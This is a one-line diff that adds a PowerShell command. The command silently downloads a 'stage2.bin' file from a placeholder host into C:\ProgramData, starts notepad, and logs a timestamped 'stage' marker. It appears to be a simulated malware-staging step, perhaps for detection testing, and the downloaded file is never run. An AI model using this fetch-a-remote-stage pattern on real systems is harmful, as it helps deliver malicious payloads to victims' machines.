@@ -1,0 +1,1 @@
+$RemoteUrl = "https://example.com:443/cdn/stage2.bin"; $Stage2Path = 'C:\ProgramData\stage1.bin'; curl.exe -s -L -o $Stage2Path $RemoteUrl; Start-Process -FilePath 'notepad.exe'; $StageMarker = "stage-39"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
